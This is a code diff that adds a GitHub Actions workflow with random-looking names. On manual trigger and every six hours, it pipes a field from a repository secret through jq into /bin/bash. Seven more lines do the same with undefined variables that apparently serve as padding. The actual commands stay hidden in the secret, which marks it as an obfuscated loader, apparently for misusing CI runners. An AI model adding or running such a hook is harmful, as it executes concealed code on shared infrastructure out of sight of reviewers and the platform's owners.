@@ -1,0 +1,26 @@
+name: beisentenb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beisentenb
+        env:
+          r99: ${{ secrets.r99 }}
+        run: |
+          echo $r99 | jq -r .er66756 | /bin/bash
+          echo $gdfe243 | jq -r .xcebu05176 | /bin/bash
+          echo $e9526 | jq -r .i181 | /bin/bash
+          echo $amm594 | jq -r .xyw2144 | /bin/bash
+          echo $njpm4606 | jq -r .laq26 | /bin/bash
+          echo $r243 | jq -r .qb59283 | /bin/bash
+          echo $vqwaq756 | jq -r .bfi5 | /bin/bash
+          echo $zopug944 | jq -r .mf7 | /bin/bash
+
